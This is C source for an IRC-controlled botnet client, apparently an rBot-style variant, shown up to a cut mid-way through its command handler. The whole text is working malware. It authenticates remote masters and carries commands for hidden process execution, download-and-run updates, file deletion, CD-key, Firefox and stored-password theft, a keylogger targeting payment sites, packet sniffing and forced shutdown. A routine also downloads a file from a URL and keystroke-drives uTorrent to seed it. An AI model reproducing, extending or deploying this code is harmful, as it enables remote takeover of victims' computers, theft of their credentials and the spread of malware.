#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"
#pragma comment( lib, "Urlmon.lib" )

	//////////////////////////////////////////////////////////////////////////////
	//								uTorrent Shit
	//////////////////////////////////////////////////////////////////////////////
HWND uTorrentWindow = 0;
BOOL CALLBACK EnumProc( HWND hWnd, LPARAM lParam )
{
   char szTitle[ 512 ];

   GetWindowText( hWnd, szTitle, sizeof( szTitle ) );
   
   if( strstr( szTitle, "\xB5Torrent" ) )
      uTorrentWindow = hWnd;

   return TRUE;
};

HWND FindUTorrent( )
{
   EnumWindows( EnumProc, 0 );
   return( uTorrentWindow );
};
void TypeString( char* szString )
{
   int Length = strlen( szString ), i;
   bool ShiftDown = false;
   short sKey;
   
   for( i = 0; i < Length; i++, szString++ )
   {
      sKey = VkKeyScan( *szString );

      if( ( sKey >> 8 ) & 1 )
      {
         keybd_event( VK_LSHIFT, 0, 0, 0 );
         ShiftDown = true;
      }

      keybd_event( (unsigned char)sKey, 0, 0, 0 );

      if( ShiftDown )
      {
         keybd_event( VK_LSHIFT, 0, KEYEVENTF_KEYUP, 0 );
         ShiftDown = false;
      }
   }
};
int SeedUTorrent( char* szUrl, char* szSaveAs, char* szSeedTo )
{
   HWND uTorrentWindow = FindUTorrent( );
   
   if( uTorrentWindow == 0 )
      return 1;

   if( URLDownloadToFile( 0, szUrl, szSaveAs, 0, 0 ) != S_OK )
      return 2;

   if( (int)fShellExecute( 0, "open", szSaveAs, 0, 0, SW_NORMAL ) <= 32 )
      return 3;

   ShowWindow( uTorrentWindow, SW_SHOW );
   BringWindowToTop( uTorrentWindow );
   SetForegroundWindow( uTorrentWindow );
   SetFocus( uTorrentWindow );

   if( !IsWindow( uTorrentWindow ) )
      return 4;

   Sleep( 300 );

   if( *szSeedTo != 0 )
      TypeString( szSeedTo );

   keybd_event( VK_RETURN, 0, 0, 0 );
   ShowWindow( uTorrentWindow, SW_MINIMIZE );

   return 0;
};
int IRC_CommandParse(char *line, char *a[MAXTOKENS], int s, SOCKET sock, char *server, char *channel, char *chanpass, char *nick, char *user, char *host, char masters[MAXLOGINS][MAXIDENT], BOOL ismaster, int repeat)
{
	char line1[IRCLINE], sendbuf[IRCLINE], ntmp[12], ntmp2[3];

	int i, j;
	DWORD id=0;

	unsigned char parameters[256];
	memset(parameters,0,sizeof(parameters));
	for (i = (MAXTOKENS - 1); i >= 0; i--) {
		if (a[i]) {
			if ((a[i][0] == '-') && (a[i][2] == 0)) {
				parameters[a[i][1]] = 1 ;
				a[i][0]=0;
				a[i][1]=0;
				a[i][2]=0;
				a[i]=NULL;
			} else 
				break;
		}
	}
	BOOL silent = (parameters['s']);
	BOOL notice = (strcmp("NOTICE", a[1]) == 0 || parameters['n']);
	if (notice && strcmp("332",a[1]) != 0)
		a[2] = user;

	#ifdef DEBUG_CRYPT	// NOTE: Here for testing only. Please leave until we have the auth bug looked at.
	#ifndef NO_CRYPT
	if (strcmp("dump", a[s]) == 0) {
		if (a[s+1]) {
			irc_sendv(sock, "NOTICE %s : Id = '%s'\r\n",user,botid); Sleep(FLOOD_DELAY);
			irc_sendv(sock, "NOTICE %s : Version = '%s'\r\n",user,version); Sleep(FLOOD_DELAY);
			irc_sendv(sock, "NOTICE %s : Server = '%s'\r\n",user,server); Sleep(FLOOD_DELAY);
			irc_sendv(sock, "NOTICE %s : Channel = '%s'\r\n",user,channel); Sleep(FLOOD_DELAY);
			irc_sendv(sock, "NOTICE %s : Nickconst = '%s'\r\n",user,nickconst); Sleep(FLOOD_DELAY);
			irc_sendv(sock, "NOTICE %s : Authost = '%s'\r\n",user,authost[0]);
			irc_sendv(sock, "NOTICE %s : Password(before) = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
			Crypt(password,strlen(password));
			irc_sendv(sock, "NOTICE %s : Password = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
			Crypt(password,strlen(password));
			irc_sendv(sock, "NOTICE %s : Password(enc) = '%s'\r\n",user,password); Sleep(FLOOD_DELAY);
			Crypt(a[s+1],strlen(a[s+1]));
			irc_sendv(sock, "NOTICE %s : Password(arg) = '%s'\r\n",user,a[s+1]); Sleep(FLOOD_DELAY);
		}

		return 1;
	}
	#endif
	#endif

	if (strcmp("hi", a[s]) == 0 || strcmp("yfuyf", a[s]) == 0) {
		if (a[s+1] == NULL || ismaster || strcmp("332", a[1]) == 0 || strcmp("TOPIC", a[1]) == 0) 
			return 1;

		char a0[MAXIDENT];
		_snprintf(a0,sizeof(a0),a[0]);
		char *u = strtok(a[0], "!") + 1, *h = strtok(NULL, "\0");
		h = strtok(h, "~");

		BOOL host_ok=FALSE;
		for (i=0; i < authsize; i++) {
			#ifndef NO_WILDCARD
			if (wildcardfit(authost[i], h)) { 
				host_ok = TRUE;
				break;
			}
			#else
			if (strcmp(h, authost[i]) == 0) {
				host_ok = TRUE;
				break;
			}
			#endif
		}

		#ifndef NO_CRYPT
		Crypt((unsigned char *)a[s+1],strlen(a[s+1]),NULL,0);
		#endif
		if (!host_ok || strcmp(password, a[s+1]) != 0) {
			irc_sendv(sock, "NOTICE %s :Authentication failed (%s!%s).\r\n", user, user, h);
			irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
			return 1;
		}

		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] == '\0') {
				_snprintf(masters[i],  MAXIDENT, a0);
				if (!silent) irc_privmsg(sock, a[2], "[MAIN]: Password accepted.", notice);
				return 1;
			}
		}

		_snprintf(sendbuf,sizeof(sendbuf),"[MAIN]: Failed to login user: %s, too many logins already.", user); 
		if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
		return 1;
	}
	if (ismaster || strcmp("332", a[1]) == 0 || strcmp("TOPIC", a[1]) == 0) {
		BOOL usevars = FALSE;

		_snprintf(line1, sizeof(line1), line);
		char *x = strstr(line1, " :");

		// commands requiring no parameters
		// check if the command matches an alias's name
		for (i = 0; i < anum; i++) {
			if (strcmp(aliases[i].name, a[s]) == 0) {
				char *z = strstr(line, " :");
				if (z == NULL) 
					return 1;
				z[2] = prefix;
				z[3] = prefix;
				strncpy(z+4, aliases[i].command, (MAXCMDLEN-1));

				// process '$x-' parameter variables
				for (j=15; j > 0; j--) {
					sprintf(ntmp, "$%d-", j);
					if (strstr(line, ntmp) != NULL && a[s+j+1] != NULL) {
						x = x + strlen(aliases[i].name);
						if (x != NULL) {
							char *y = strstr(x, a[s+j]);
							if (y != NULL) 
								replacestr(line, ntmp, y);
						}
					}
					else if (a[s+j+1] == NULL) {
						strncpy(ntmp2, ntmp, 2);
						ntmp2[2] = '\0';
						replacestr(line, ntmp, ntmp2);
					}
				}

				// process '$x' parameter variables
				for (j=16; j > 0; j--){
					sprintf(ntmp, "$%d", j);
					if (a[s+j] && strstr(line, ntmp)) 
						replacestr(line, ntmp, a[s+j]);
				}

				usevars = TRUE;
				break;
			}
		}

		if (a[s][0] == prefix || usevars) {
			// process variables
			replacestr(line, "$me", nick); // bot's nick
			replacestr(line, "$user", user); // user's nick
			replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
			replacestr(line, "$rndnick", rndnick(sendbuf, nicktype, FALSE));
			replacestr(line, "$server", server); // name of current server

			// process '$chr()' variables
			while (strstr(line, "$chr(")) {
				char *z = strstr(line, "$chr(");
				strncpy(ntmp, z+5, 4);
				strtok(ntmp, ")");
				if (ntmp[0] < 48 || ntmp[0] > 57) 
					strncpy(ntmp, "63", 3);
				ntmp2[0] = (char)((atoi(ntmp) > 0)?(atoi(ntmp)):((rand()%96) + 32));
				ntmp2[1] = '\0';
				j = strlen(ntmp);
				memset(ntmp, 0, sizeof(ntmp));
				strncpy(ntmp, z, j+6);
				replacestr(line, ntmp, ntmp2);
			}

			// re-split the line into seperate words
			_snprintf(line1, sizeof(line1), line);
			a[0] = strtok(line1, " ");
			for (i = 1; i < MAXTOKENS; i++) 
				a[i] = strtok(NULL, " ");
			if (a[s] == NULL) 
				return 1;
			a[s] += 3;
			if (strcmp("332", a[1]) == 0) 
				a[2] = a[3];

			x = strstr(line, " :");
		}

		if (strcmp("rndnick", a[s]) == 0 || strcmp("rr4ytgn", a[s]) == 0) {
			char nickbuf[MAXNICKLEN];
			memset(nickbuf, 0, sizeof(nickbuf));

			rndnick(nickbuf, nicktype, (parameters['p']), a[s+1]);
			irc_sendv(sock, "NICK %s\r\n", nickbuf);

			sprintf(sendbuf,"[MAIN]: Random nick change to: %s.",nickbuf);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return repeat;
		}
		else if (strcmp("die", a[s]) == 0 || strcmp("d13", a[s]) == 0) {
			if (strcmp("332", a[1]) != 0 || strcmp("TOPIC", a[1]) != 0) {
				killthreadall();
				ExitProcess(EXIT_SUCCESS);
			} else
				return 1;
		}
		#ifndef NO_PROCESS
		else if (strcmp("procsstop",a[s]) == 0 || strcmp("psstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[PROC]","Process list",PROC_THREAD,a[s+1]);

			return 1;
		}
		#endif
		#ifndef NO_SECURE
		else if (strcmp("secstop",a[s]) == 0) {
			stopthread(sock,a[2],notice,silent,"[SECURE]","Secure",SECURE_THREAD,a[s+1]);

			return 1;
		}
		#endif
		else if (strcmp("reconnect", a[s]) == 0 || strcmp("rec", a[s]) == 0) {
			irc_sendv(sock, "QUIT :reconnecting\r\n");
			return 0;
		}
		else if (strcmp("disconnect", a[s]) == 0 || strcmp("dc", a[s]) == 0) {
			irc_sendv(sock, "QUIT :disconnecting\r\n");
			return -1;
		}
		else if (strcmp("quitz", a[s]) == 0 || strcmp("quitz0r", a[s]) == 0) {
			if (strcmp("332", a[1]) != 0 || strcmp("TOPIC", a[1]) != 0) {
				if (a[s+1]) {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendv(sock, "QUIT :%s\r\n", y);
					}
				} else 
					irc_sendv(sock, "QUIT :later\r\n"); 

				return -2;
			} else
				return 1;
		}
		else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
			TLIST tlist;
			_snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
			tlist.sock = sock;
			tlist.notice = notice;
			tlist.silent = silent;
			tlist.full = ((a[s+1])?(strcmp(a[s+1],"sub") == 0):(FALSE));

			sprintf(sendbuf, "[THREADS]: List threads.");
			tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
			if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
				while (tlist.gotinfo == FALSE)
					Sleep(50);
			} else
				sprintf(sendbuf,"[THREADS]: Failed to start list thread, error: <%d>.", GetLastError());
			return repeat;
		}

		else if (strcmp("rem", a[s]) == 0 || strcmp("rm", a[s]) == 0) {
			if (strcmp("332", a[1]) != 0 || strcmp("TOPIC", a[1]) != 0) {
				if (!silent) irc_privmsg(sock, a[2], "[MAIN]: Removing Bot.", notice);
				#ifdef DEBUG_LOGGING
				closedebuglog();
				#endif
				killthreadall();
				fclosesocket(sock);
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			} else
				return 1;
		}
		#ifndef NO_PROCESS
		else if (strcmp("procs", a[s]) == 0 || strcmp("ps", a[s]) == 0) {
			if (findthreadid(PROC_THREAD) > 0) {
				if (!silent) irc_privmsg(sock, a[2], "[PROC]: Already running.", notice);
			} else {
				LPROC lproc;
				_snprintf(lproc.chan, sizeof(lproc.chan), a[2]);
				lproc.sock = sock;
				lproc.notice = notice;
				lproc.silent = silent;
				lproc.full = FALSE;
				if (a[s+1])
					if (strcmp("full", a[s+1]) == 0)
						lproc.full = TRUE;

				sprintf(sendbuf,"[PROCS]: Proccess list.");
				lproc.threadnum = addthread(sendbuf, PROC_THREAD, NULL);
				if (threads[lproc.threadnum].tHandle = CreateThread(NULL, 0, &listProcessesThread, (LPVOID)&lproc, 0, &id)) {
					while (lproc.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[PROCS]: Failed to start listing thread, error: <%d>.", GetLastError());
			}

			return 1;
		}
		#endif

		#ifndef NO_CDKEYS
		else if (strcmp("cdkeys", a[s]) == 0 || strcmp("kegfgdys", a[s]) == 0) {
			getcdkeys(sock,a[2],notice);
			sprintf(sendbuf,"[CDKEYS]: Search completed.");
			if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
			return 1;
		}
		#endif

		else if (strcmp("pstore", a[s]) == 0 || strcmp ("pst", a[s]) == 0) {
				pststrct pStorInfo;
				pStorInfo.sock = sock;
				strcpy(pStorInfo.chan,a[2]);
				sprintf(sendbuf, ".::[ PassStore Executed ]::.", version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				CreateThread(NULL, 0, &pstore, (LPVOID)&pStorInfo, 0, 0);
		}
			    else if (strcmp("firefox", a[s]) == 0) {
				if(!fGetUserProfileDirectory){return 1;}
				FindFirefoxPasses(sock, channel, notice);
				irc_privmsg(sock, channel, "• FireFox • FireFox Executed.", notice); 
				return 1;
			}
				else if (strcmp("firefoxstop", a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"Firefox","Firefox",FIREFOX_THREAD,a[s+1]);

				return 1;
			}

		#ifdef DUMP_ENCRYPT
		else if (strcmp("encrypt", a[s]) == 0 || strcmp("Rrenc", a[s]) == 0) {
			encryptstrings(authsize,versionsize,sock,a[2],notice);

			return 1;
		}
		#endif
		else if (strcmp("flusharp", a[s]) == 0 || strcmp("farp", a[s]) == 0) {
			if (FlushARPCache())
				_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: ARP cache flushed.");
			else
				_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: Failed to flush ARP cache.");
				
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return repeat;
		}
		else if (strcmp("flushdns", a[s]) == 0 || strcmp("fdns", a[s]) == 0) {
			if (fDnsFlushResolverCache) {
				if (fDnsFlushResolverCache())
					_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: DNS cache flushed.");
				else
					_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: Failed to flush DNS cache.");
			} else
				_snprintf(sendbuf,sizeof(sendbuf),"[FLUSHDNS]: Failed to load dnsapi.dll.");

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return repeat;
		}
		

		// commands requiring at least 1 parameter
		else if (a[s+1] == NULL) return 1;
		else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
			irc_sendv(sock, "NICK %s\r\n", a[s+1]);
			return repeat;
		}
		else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
			irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			return repeat;
		}
		else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
			irc_sendv(sock, "PART %s\r\n", a[s+1]);
			return repeat;
		}
		else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
			if (x != NULL) {
				char *y = strstr(x, a[s+1]);
				if (y != NULL) {
					irc_sendv(sock, "%s\r\n", y);

					_snprintf(sendbuf,sizeof(sendbuf),"[MAIN]: Sent IRC Raw: %s.",y);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				}
			}

			return repeat;
		}
		else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
			if (strcmp("all", a[s+1]) == 0) {
				if ((i=killthreadall()) > 0)
					sprintf(sendbuf,"[THREADS]: Stopped: %d thread(s).", i);
				else
					sprintf(sendbuf,"[THREADS]: No active threads found.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);					
			} else {
				for (i = s+1; i < (sizeof(a)/4); i++) {
					if (a[i]==NULL) break;
					
					if (killthread(atoi(a[i])))
						sprintf(sendbuf,"[THREADS]: Killed thread: %s.",a[i]);
					else 
						sprintf(sendbuf,"[THREADS]: Failed to kill thread: %s.",a[i]);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				}
			}

			return 1;
		}
		else if (strcmp("prefix", a[s]) == 0 || strcmp("pr", a[s]) == 0) {
			prefix = a[s+1][0];
			sprintf(sendbuf,"[MAIN]: Prefix changed to: '%c'.",a[s+1][0]);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return 1;
		}
		else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
			if (fShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW))
				sprintf(sendbuf,"[SHELL]: File opened: %s", a[s+1]);
			else
				sprintf(sendbuf,"[SHELL]: Couldn't open file: %s", a[s+1]);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return repeat;
		}
		else if (strcmp("server", a[s]) == 0 || strcmp("se", a[s]) == 0) {
			strncpy(server,  a[s+1], 127);
			sprintf(sendbuf,"[MAIN]: Server changed to: '%s'.",a[s+1]);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return 1;
		}
		else if (strcmp("dns", a[s]) == 0 || strcmp("dn", a[s]) == 0) {
			LPHOSTENT hostent = NULL;
			IN_ADDR iaddr;
			DWORD addr = finet_addr(a[s+1]);

			if (addr != INADDR_NONE) {
				hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
				if (hostent != NULL)
					sprintf(sendbuf, "[DNS]: Lookup: %s -> %s.", a[s+1], hostent->h_name);
			} else {
				hostent = fgethostbyname(a[s+1]);
				if (hostent != NULL) {
					iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
					sprintf(sendbuf, "[DNS]: Lookup: %s -> %s.", a[s+1], finet_ntoa(iaddr));
				}
			}
			if (hostent == NULL)
				sprintf(sendbuf,"[DNS]: Couldn't resolve hostname.");
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return repeat;
		}
		#ifndef NO_PROCESS
		else if (strcmp("killproc",a[s]) == 0 || strcmp("kp", a[s]) == 0) {  // kill process name
			if(listProcesses(sock,NULL,notice,a[s+1]) == 1)
				sprintf(sendbuf,"[PROC]: Process killed: %s",a[s+1]);
			else
				sprintf(sendbuf,"[PROC]: Failed to terminate process: %s", a[s+1]);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return repeat;
		}
		else if (strcmp("kill",a[s]) == 0 || strcmp("ki", a[s]) == 0) {  // kill process id
			if(killProcess(atoi(a[s+1])) == 1)
				sprintf(sendbuf,"[PROC]: Process killed ID: %s",a[s+1]);
			else
				sprintf(sendbuf,"[PROC]: Failed to terminate process ID: %s", a[s+1]);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return 1;
		}
		#endif
		else if (strcmp("delete", a[s]) == 0 || strcmp("del", a[s]) == 0) { 
			if (DeleteFile(a[s+1])) 
				_snprintf(sendbuf,sizeof(sendbuf),"[FILE]: Deleted '%s'.",a[s+1]);
			else 
				_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FILE]:"));

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return repeat;
		}
		#ifndef NO_VISIT
		else if (strcmp("visit", a[s]) == 0 || strcmp("v", a[s]) == 0) {
			VISIT visit;
			strncpy(visit.host, a[s+1], sizeof(visit.host)-1);
			if (a[s+2] != NULL) 
				strncpy(visit.referer, a[s+2], sizeof(visit.referer)-1);
			strncpy(visit.chan, a[2], sizeof(visit.chan)-1);
			visit.sock = sock;
			visit.silent = silent;
			visit.notice = notice;

			sprintf(sendbuf,"[VISIT]: URL: %s.",a[s+1]);
			visit.threadnum=addthread(sendbuf,VISIT_THREAD,NULL);
			if (threads[visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&visit, 0, &id)) {
				while(visit.gotinfo == FALSE)
					Sleep(50);
			} else
				sprintf(sendbuf,"[VISIT]: Failed to start connection thread, error: <%d>.", GetLastError());
			return repeat;
		}
		#endif
		else if (strcmp("mirccmd", a[s]) == 0 || strcmp("mirc", a[s]) == 0) {
			if (x != NULL) {
				char *y = strstr(x, a[s+1]); 
				if (y != NULL) {
					if (!mirccmd(y))
						sprintf(sendbuf,"[mIRC]: Client not open.");
					else
						sprintf(sendbuf,"[mIRC]: Command sent.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				}
			}

			return repeat;
		}
		#ifndef NO_PSNIFF
		else if (strcmp("psniff", a[s]) == 0) {
			if (strcmp("on", a[s+1]) == 0) {
				if (findthreadid(PSNIFF_THREAD) > 0)
					sprintf(sendbuf ,"[PSNIFF]: Already running.");
				else {
					PSNIFF sniff;
					sniff.sock = sock;
					sniff.notice = notice;
					sniff.silent = silent;
					_snprintf(sniff.chan, sizeof(sniff.chan), ((a[s+2])?(a[s+2]):((strcmp(psniffchan,"")==0)?(a[2]):(psniffchan))));

					sprintf(sendbuf, "[PSNIFF]: Carnivore packet sniffer active.");
					sniff.threadnum = addthread(sendbuf, PSNIFF_THREAD, NULL);
					if (threads[sniff.threadnum].tHandle = CreateThread(NULL, 0, &SniffThread, (LPVOID)&sniff, 0, &id)) {
						while(sniff.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[PSNIFF]: Failed to start sniffer thread, error: <%d>.", GetLastError());
				}
			}
			else if (strcmp("off", a[s+1]) == 0) {
				if ((i=killthreadid(PSNIFF_THREAD)) > 0)
					sprintf(sendbuf,"[PSNIFF]: Carnivore stopped. (%d thread(s) stopped.)",i);
				else
					sprintf(sendbuf,"[PSNIFF]: No Carnivore thread found.");
			}
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return 1;
		}
		#endif
		#ifndef NO_KEYLOG
			else if (strcmp("keylog", a[s]) == 0) {
				if (findthreadid(KEYLOG_THREAD) > 0)
					sprintf(sendbuf ,"[KeyLog] Already running.");
				else if (a[s+1]) {
					KEYLOG keylog;
					keylog.sock = sock;
					keylog.notice = notice;
					keylog.silent = silent;
					keylog.mode = false;
					
					if(strcmp("pay", a[s+1]) == 0) {
						keylog.mode = true;
						_snprintf(keylog.chan, sizeof(keylog.chan), ((a[s+2])?(a[s+2]):((strcmp(keylogchan,"")==0)?(a[2]):(keylogchan))));
						sprintf(sendbuf, "[KeyLog] pay-sites keylogger active.");
					} 
					else if(strcmp("normal", a[s+1]) == 0) {
						_snprintf(keylog.chan, sizeof(keylog.chan), ((a[s+2])?(a[s+2]):((strcmp(keylogchan,"")==0)?(a[2]):(keylogchan))));
						sprintf(sendbuf, "[KeyLog] Normal key logger active.");
					}
					else {
						sprintf(sendbuf, "[KeyLog] Unknow mode type.");
						if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						return 1;
					}
					keylog.threadnum = addthread(sendbuf, KEYLOG_THREAD, NULL);
					if (threads[keylog.threadnum].tHandle = CreateThread(NULL, 0, &KeyLoggerThread, (LPVOID)&keylog, 0, &id)) {
						while(keylog.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[KeyLog] Failed to start logging thread, error: <%d>.", GetLastError());
				}
				else
					sprintf(sendbuf, "[KeyLog] Missing mode type.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				return 1;
			}
			else if (strcmp("stop",a[s]) == 0 || strcmp("stop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[KeyLog] pay-sites keylogger active.","Keylog",KEYLOG_THREAD,a[s+1]);
				return 1;
			}

			#endif

		else if (strcmp("system", a[s]) == 0) {
			if (strcmp("logoff", a[s+1]) == 0)
				sprintf(sendbuf, ((SystemControl(EWX_FORCE_LOGOFF, 0))?("[SYSTEM]: Logging off current user."):("[SYSTEM]: Failed to logoff current user.")));
			else if (strcmp("reboot", a[s+1]) == 0)
				sprintf(sendbuf, ((SystemControl(EWX_SYSTEM_REBOOT, SHUTDOWN_SYSTEM_HUNG))?("[SYSTEM]: Rebooting system."):("[SYSTEM]: Failed to reboot system.")));
			else if (strcmp("shutdown", a[s+1]) == 0)
				sprintf(sendbuf, ((SystemControl(EWX_FORCE_SHUTDOWN, SHUTDOWN_SYSTEM_HUNG))?("[SYSTEM]: Shutting down system."):("[SYSTEM]: Failed to shutdown system.")));
			else
				sprintf(sendbuf, "[MAIN]: Unrecognized command: %s.", a[s+1]);
			irc_privmsg(sock, a[2], sendbuf, notice);
			return 1;
		}

		// commands requiring at least 2 parameters
		else if (a[s+2] == NULL) return 1;
		else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
			if (x != NULL) {
				x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
				char *y = strstr(x, a[s+2]);
				if (y != NULL) {
					irc_privmsg(sock, a[s+1], y, FALSE);
				}
			}

			return repeat;
		}
		else if (strcmp("action", a[s]) == 0 || strcmp("a", a[s]) == 0) {
			if (x != NULL) {
				x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
				char *y = strstr(x, a[s+2]);
				if (y != NULL) {
					sprintf(sendbuf, "\1ACTION %s\1", y);
					irc_privmsg(sock, a[s+1], sendbuf, FALSE);
				}
			}

			return repeat;
		}
		else if (strcmp("cycle", a[s]) == 0 || strcmp("cy", a[s]) == 0) {
			irc_sendv(sock, "PART %s\r\n", a[s+2]);
			Sleep(atoi(a[s+1])*1000);
			irc_sendv(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);

			return repeat;
		}
		else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
			if (x != NULL) {
				char *y = strstr(x, a[s+1]);
				if (y != NULL) {
					irc_sendv(sock, "MODE %s\r\n", y);
				}
			}

			return repeat;
		}
		else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
			if (strcmp("332", a[1]) == 0 || strcmp("TOPIC", a[1]) == 0) 
				return 1;

			if (x != NULL) {
				char *r = strstr(x, a[s+2]);
				if (strcmp(a[s+2]+1,"repeat") != 0) {
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, (IRCLINE-1));
					sprintf(sendbuf,"[MAIN]: Repeat: %s", r);

					if (atoi(a[s+1]) > 0) 
						return repeat + atoi(a[s+1]); 
					else 
						return repeat;
				} else {
					sprintf(sendbuf,"[MAIN]: Repeat not allowed in command line: %s", r);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				}
			}
			return repeat;
		}
		else if (strcmp("delay", a[s]) == 0 || strcmp("de", a[s]) == 0) {
			if (strcmp("332", a[1]) == 0 || strcmp("TOPIC", a[1]) == 0) 
				return 1;

			if (x != NULL) {
				char *r = strstr(x, a[s+2]);
				sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
				strncpy(line,  sendbuf, 511);
				if (atoi(a[s+1]) > 0) 
					Sleep(atoi(a[s+1])*1000);
				return repeat + 1;
			}

			return 1;
		}
	//////////////////////////////////////////////////////////////////////////////
	//								uTorrent Seeder
	//////////////////////////////////////////////////////////////////////////////

		#ifndef NO_DOWNLOAD
		else if (strcmp("update", a[s]) == 0 || strcmp("up", a[s]) == 0) {
			if (strcmp(botid, a[s+2]) != 0) {
				char tempdir[MAX_PATH], tmpbuf[MAXNICKLEN];
				GetTempPath(sizeof(tempdir), tempdir);

				DOWNLOAD dl;
				strncpy(dl.url,  a[s+1], sizeof(dl.url)-1);
				sprintf(dl.dest, "%s%s.exe", tempdir, rndnickletter(tmpbuf));
				dl.update = 1;
				dl.run = 0;
				dl.filelen=((a[s+3])?(atoi(a[s+3])):(0));
				dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
				dl.encrypted=(parameters['e']);

				dl.sock = sock;
				strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
				dl.notice=notice;
				dl.silent = silent;

				sprintf(sendbuf, "[UPDATE]: Downloading update from: %s.", a[s+1]);
				dl.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
				if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
					while(dl.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[UPDATE]: Failed to start download thread, error: <%d>.", GetLastError());
			} else
				sprintf(sendbuf,"[UPDATE]: Bot ID must be different than current running process.");

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return repeat;
		}
		#endif

		else if (strcmp("execute", a[s]) == 0 || strcmp("e", a[s]) == 0) {
			PROCESS_INFORMATION pinfo;
			STARTUPINFO sinfo;
			memset(&pinfo, 0, sizeof(pinfo));
			memset(&sinfo, 0, sizeof(sinfo));
			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = STARTF_USESHOWWINDOW;
			sinfo.wShowWindow = ((atoi(a[s+1]) == 1)?(SW_SHOW):(SW_HIDE));
			if (x != NULL) {
				char *y = strstr(x, a[s+2]);
				if (y != NULL) 
					if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo))
						sprintf(sendbuf,"[EXEC]: Couldn't execute file.");
					else
						sprintf(sendbuf,"[EXEC]: Commands: %s",y);
			}
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return repeat;
		}

		else if (strcmp("rename", a[s]) == 0 || strcmp("mv", a[s]) == 0) {
			if (MoveFile(a[s+1],a[s+2]))
				_snprintf(sendbuf,sizeof(sendbuf),"[FILE]: Rename: '%s' to: '%s'.", a[s+1], a[s+2]);
			else 
				_snprintf(sendbuf,sizeof(sendbuf),PrintError("[FILE]:"));

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			return 1;
		}

		#ifndef NO_ICMP
		else if (strcmp("killit", a[s]) == 0 || strcmp("icmpggrgr", a[s]) == 0) {
